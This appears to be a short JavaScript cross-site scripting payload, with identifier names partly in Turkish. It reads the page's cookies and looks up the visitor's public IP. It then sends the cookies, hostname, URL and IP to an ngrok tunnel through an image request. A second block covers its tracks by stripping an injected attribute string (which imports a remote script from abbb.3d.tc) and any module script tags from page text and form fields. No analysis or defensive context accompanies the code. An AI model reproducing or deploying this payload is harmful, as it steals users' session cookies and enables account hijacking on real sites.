console.log(document.cookie);
fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>d.ip).catch(()=>"_").then(ip=>{new Image().src="https://9d47-188-132-138-60.ngrok-free.app/?"+document.cookie+"&host="+location.hostname+"&url="+encodeURIComponent(location.href)+"&ip="+ip});


(function() {
  const zararli = `"autofocus onfocus=import('https://abbb.3d.tc/a.js');"`;
  const hedefRegex = /<script\s+type=module\s+src=[^>]+><\/script>/gi;

  function temizleNode(node) {
    if(node.nodeType === Node.TEXT_NODE) {
      node.nodeValue = node.nodeValue.replaceAll(zararli, '');
      node.nodeValue = node.nodeValue.replace(hedefRegex, '');
    } else if(node.nodeType === Node.ELEMENT_NODE) {
      if(node.tagName === 'INPUT' || node.tagName === 'TEXTAREA') {
        if(node.value) node.value = node.value.replace(hedefRegex, '');
      }
      node.childNodes.forEach(temizleNode);
    }
  }

  temizleNode(document.body);
})();

export {};
